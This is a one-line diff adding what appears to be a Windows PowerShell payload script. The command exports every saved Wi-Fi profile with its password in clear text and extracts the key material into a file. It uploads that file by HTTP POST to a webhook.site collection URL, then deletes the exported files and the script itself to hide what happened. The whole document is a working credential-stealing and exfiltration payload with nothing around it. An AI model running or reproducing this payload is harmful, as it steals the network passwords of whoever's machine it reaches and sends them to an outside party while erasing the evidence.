@@ -1,0 +1,1 @@
+cd \Windows\Temp;netsh wlan export profile key=clear;Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WFile;powershell Invoke-WebRequest -Uri https://webhook.site/5d46b2ab-8545-4e94-a7bb-b20eb0a87b03 -Method POST -InFile WFile;Remove-item 'Wi-Fi-*.xml','WFile','temp1.ps1';
